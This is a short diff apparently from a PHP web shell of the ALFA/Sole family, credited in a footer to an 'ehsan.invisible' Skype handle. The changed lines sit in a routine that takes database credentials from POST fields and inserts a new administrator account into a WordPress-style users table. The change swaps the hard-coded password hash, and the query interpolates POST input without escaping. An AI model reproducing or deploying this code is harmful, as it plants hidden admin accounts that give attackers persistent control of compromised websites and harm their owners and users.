@@ -3919,7 +3919,7 @@ $admin = $_POST['alfa8'];
 $SQL = $_POST['alfa9'];
 $prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','25caa4fe41c2310dc0eed16a6726fc25','$SQL')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
 $sole = @mysqli_num_rows($solevisible);
 if ($sole == 1){
@@ -6530,4 +6530,5 @@ exit;
 #skype : ehsan.invisible
 */
 ?>
+
 
